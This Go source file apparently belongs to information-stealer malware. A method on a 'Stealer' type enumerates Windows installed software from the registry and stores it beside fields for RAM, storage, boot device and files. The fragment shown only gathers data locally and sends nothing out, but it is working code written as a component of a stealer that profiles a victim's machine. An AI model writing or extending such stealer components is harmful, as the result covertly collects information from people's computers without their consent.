package main

import (
	"time"

	"golang.org/x/sys/windows/registry"
)

type Memory struct {
	TotalRAM          string
	FreeRAM           string
	BootDevice        string
	StorageCapacity   string
	InstalledSoftware []string
	Files             Files
}

// Newly rewritten, improved function runtime from 12s to 2ms (!)
func (stealer *Stealer) GetInstalledSoftware() {
	defer TimeTrack(time.Now())

	// Open the registry key that contains information about installed software
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return
	}
	defer key.Close()

	// Get the list of subkeys (i.e., installed software)
	subkeyNames, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return
	}

	// Add each subkey name to the list of installed software
	for _, subkeyName := range subkeyNames {
		subkey, err := registry.OpenKey(key, subkeyName, registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		defer subkey.Close()

		displayName, _, err := subkey.GetStringValue("DisplayName")
		if err != nil || displayName == "" {
			continue
		}

		stealer.Memory.InstalledSoftware = append(stealer.Memory.InstalledSoftware, displayName)
	}
}
